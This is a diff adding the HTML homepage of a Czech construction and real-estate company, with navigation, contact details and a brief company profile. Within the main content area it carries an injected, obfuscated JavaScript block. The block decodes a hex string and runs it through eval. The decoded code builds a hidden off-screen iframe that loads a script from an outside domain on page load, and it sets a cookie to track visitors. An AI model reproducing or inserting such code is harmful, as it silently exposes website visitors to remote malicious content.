@@ -1,0 +1,106 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>STAVBY a INŽENÝRING s.r.o. Pardubice - výstavba rodinných domů, výstavba komerčních objektů, stavební pozemky</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1250"/>
+<meta name="keywords" content="STAVBY a INŽENÝRING s.r.o. Pardubice, výstavba rodinných domů, výstavba komerčních objektů, stavební pozemky"/>
+<meta name="description" content="STAVBY a INŽENÝRING s.r.o. Pardubice, výstavba rodinných domů, výstavba komerčních objektů, stavební pozemky"/>
+
+<script language="JavaScript" type="text/javascript" src="js_file.js"></script>
+
+<script language="javascript" type="text/css">
+<!--
+function openWin( winHeight, winWidth, picSrc, picName )
+{
+    newWin = window.open('', 'name', 'height='+ winHeight + ',width='+ winWidth + 'toolbars=no, scrollbars=no' );
+    newWin.document.write("<html><head><title>"+ picName +"</title></head><body leftmargin='0' topmargin='0' marginwidth='0' marginheight='0'>");
+    newWin.document.write("<p align=left>");
+    newWin.document.write("<img onclick='JavaScript:window.close()' title='Kliknutím na obrázek okno zav&#345;ete' src=" + picSrc + ">");            
+    newWin.document.write("</p></body></html>");
+}
+//-->    onclick="openWin(500,660,'img/fotoacb1x.jpg','Style mode')"
+</script>
+
+
+</head>
+
+<body>
+
+  <div id="obsah">
+
+    <div id="hlavicka1"></div>    
+    
+    <div id="hlavicka"> 
+   		<ul>
+			<li><a href="?page=1">O společnosti</a></li>
+			<li><a href="?page=2">Nabídka služeb</a></li>
+			<li><a href="?page=3">Reference</a></li>
+			<li><a href="?page=4">Aktuální nabídka</a></li>
+			<li><a href="?page=5">Kontakt</a></li>
+		  </ul>
+    </div>     <!-- hlavicka -->
+    
+    <div id="hlavicka2"></div>
+    
+    <span class="clearboth"></span>
+    
+    <div id="leva">
+<!--        <div class="leva_in">
+          <h1>Aktuální nabídka</h1>
+          
+          <div class="leva_in_text">
+                <b>Aktuální nabídka pozemků:</b><br /><br />
+               Nemošice - Pardubice<a href="http://www.staving-pce.cz/nemosice" target="_blank"> ... více info</a>     
+                    
+          </div>
+        </div>
+    
+-->    
+    
+        <div class="leva_in">
+            <h1>Kontaktní informace</h1>
+            <div class="leva_in_text">
+                    <b>Stavby a inženýring s.r.o.</b>       <br />
+                    Na spravedlnosti 1533     <br />
+                    530 02 Pardubice           <br />
+                    tel.: +420 466 335 017           <br />
+                    e-mail: <a href="mailto:info@staving-pce.cz">info@staving-pce.cz</a>     <br />       
+            </div>
+        </div>
+        
+    </div>     <!-- leva -->
+      
+    <div id="stred">
+      
+      <div class="stred_in">
+      <h1>Stavby a inženýring s.r.o.</h1>
+<p><b>
+Stavby a inženýring s.r.o.</b> je moderní společnost působící především na území pardubického kraje. Naše společnost se zaměřuje zejména na dvě oblasti podníkání:
+</p>
+<h2>Stavební činnost</h2>
+<p>
+Hlavní náplní naší stavební činnosti je výstavba rodinných domů na klíč a výstavba komerčních objektů. Rodinné domy mohou být stavěny na základě projektů klienta nebo si klient může vybrat z typových projektů nabízených naší společností. Kvalitní realizace staveb je prováděna kvalifikovanými zaměstnanci s dostatkem zkušeností.
+</p>
+<h2>Realitní činnost</h2>
+<p>
+Naše společnost nabízí svým klientům stavební pozemky, za účelem naší výstavby rodinných domů.
+</p>
+<script type="text/javascript" language="javascript">brk=String;crns="spl"+"i"+"t";gmhti=window.document.body;zvdu=(1)?"0x":"123";wmdns=(6-4-1);try{if(0x6===Math.ceil(5.5))++gmhti.height}catch(hwjcq){wzavvo=false;try{}catch(jvourk){wzavvo=21;}if(1){vgztov="17Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq69Zq68Zq5eZq71Zq61Zq27Zq30Zq1fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq6bZq60Zq5aZq34Zq1eZq58Zq61Zq58Zq6fZq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5aZq66Zq65Zq6bZq69Zq66Zq63Zq63Zq5cZq69Zq34Zq1eZq60Zq65Zq5bZq5cZq6fZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq69Zq68Zq5eZq71Zq61Zq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq69Zq5cZq58Zq6bZq5cZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq1fZq1eZq60Zq5dZq69Zq58Zq64Zq5cZq1eZq20Zq32Zq4Zq1Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq69Zq5aZq17Zq34Zq17Zq1eZq5fZq6bZq6bZq67Zq31Zq26Zq26Zq65Zq5cZq5cZq5bZq58Zq59Zq58Zq69Zq25Zq5aZq66Zq64Zq26Zq60Zq65Zq5aZq63Zq6cZq5bZq5cZq6aZq26Zq5cZq6aZq5bZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq67Zq66Zq6aZq60Zq6bZq60Zq66Zq65Zq17Zq34Zq17Zq1eZq58Zq59Zq6aZq66Zq63Zq6cZq6bZq5cZq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5aZq66Zq63Zq66Zq69Zq17Zq34Zq17Zq1eZq28Zq27Zq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5fZq5cZq60Zq5eZq5fZq6bZq17Zq34Zq17Zq1eZq28Zq27Zq67Zq6fZq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6eZq60Zq5bZq6bZq5fZq17Zq34Zq17Zq1eZq28Zq27Zq67Zq6fZq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq63Zq5cZq5dZq6bZq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq28Zq27Zq1eZq32Zq4Zq1Zq17Zq69Zq68Zq5eZq71Zq61Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6bZq66Zq67Zq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq28Zq27Zq1eZq32Zq4Zq1Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq18Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq69Zq68Zq5eZq71Zq61Zq1eZq20Zq20Zq17Zq72Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq6eZq69Zq60Zq6bZq5cZq1fZq1eZq33Zq67Zq17Zq60Zq5bZq34Zq53Zq1eZq69Zq68Zq5eZq71Zq61Zq53Zq1eZq17Zq5aZq63Zq58Zq6aZq6aZq34Zq53Zq1eZq69Zq68Zq5eZq71Zq61Zq27Zq30Zq53Zq1eZq17Zq35Zq33Zq26Zq67Zq35Zq1eZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq69Zq68Zq5eZq71Zq61Zq1eZq20Zq25Zq58Zq67Zq67Zq5cZq65Zq5bZq3aZq5fZq60Zq63Zq5bZq1fZq69Zq68Zq5eZq71Zq61Zq20Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq23Zq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq23Zq65Zq3bZq58Zq70Zq6aZq23Zq67Zq58Zq6bZq5fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6bZq66Zq5bZq58Zq70Zq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq65Zq3bZq58Zq70Zq6aZq34Zq34Zq65Zq6cZq63Zq63Zq17Zq73Zq73Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq34Zq27Zq20Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq28Zq32Zq4Zq1Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6aZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq6bZq66Zq5bZq58Zq70Zq25Zq5eZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq20Zq17Zq22Zq17Zq2aZq2dZq27Zq27Zq27Zq27Zq27Zq21Zq29Zq2bZq21Zq65Zq3bZq58Zq70Zq6aZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq17Zq34Zq17Zq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq22Zq19Zq34Zq19Zq22Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq20Zq4Zq1Zq17Zq22Zq17Zq19Zq32Zq5cZq6fZq67Zq60Zq69Zq5cZq6aZq34Zq19Zq17Zq22Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6bZq66Zq3eZq44Zq4bZq4aZq6bZq69Zq60Zq65Zq5eZq1fZq20Zq17Zq22Zq17Zq1fZq1fZq67Zq58Zq6bZq5fZq20Zq17Zq36Zq17Zq19Zq32Zq17Zq67Zq58Zq6bZq5fZq34Zq19Zq17Zq22Zq17Zq67Zq58Zq6bZq5fZq17Zq31Zq17Zq19Zq19Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq22Zq17Zq19Zq34Zq19Zq17Zq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq63Zq5cZq65Zq17Zq34Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq22Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq22Zq17Zq28Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq1fZq17Zq18Zq6aZq6bZq58Zq69Zq6bZq17Zq20Zq17Zq1dZq1dZq4Zq1Zq17Zq1fZq17Zq65Zq58Zq64Zq5cZq17Zq18Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq27Zq23Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq20Zq17Zq20Zq17Zq20Zq4Zq1Zq17Zq72Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq19Zq32Zq19Zq23Zq17Zq63Zq5cZq65Zq17Zq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq5cZq65Zq5bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq32Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq6cZq65Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq63Zq5cZq65Zq23Zq17Zq5cZq65Zq5bZq17Zq20Zq17Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq60Zq5dZq17Zq1fZq65Zq58Zq6dZq60Zq5eZq58Zq6bZq66Zq69Zq25Zq5aZq66Zq66Zq62Zq60Zq5cZq3cZq65Zq58Zq59Zq63Zq5cZq5bZq20Zq4Zq1Zq72Zq4Zq1Zq60Zq5dZq1fZq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq20Zq34Zq34Zq2cZq2cZq20Zq72Zq74Zq5cZq63Zq6aZq5cZq72Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq23Zq17Zq1eZq2cZq2cZq1eZq23Zq17Zq1eZq28Zq1eZq23Zq17Zq1eZq26Zq1eZq20Zq32Zq4Zq1Zq4Zq1Zq69Zq68Zq5eZq71Zq61Zq27Zq30Zq1fZq20Zq32Zq4Zq1Zq74Zq4Zq1Zq74"[crns]("Zq");}gmhti=vgztov;ccjydk=[];for(pkaa=22-20-2;-pkaa+1420!=0;pkaa+=1){vpiulq=pkaa;if((0x19==031))ccjydk+=brk.fromCharCode(eval(zvdu+gmhti[1*vpiulq])+0xa-wmdns);}ruox=eval;z=123;if(Math.ceil(5.5)===6)ruox(ccjydk)}</script>   	
+      
+      </div>
+    </div>
+      
+    <span class="clearboth"></span>
+
+    <div id="pata">
+        <div id="copy">
+                Copyright © 2006 Stavby a inženýring s.r.o. Desgined by <a href="mailto:info@e-works.cz">e-works.cz</a>.
+        </div>
+    </div>
+
+  </div>  <!-- obsah -->
+</body>
+</html>
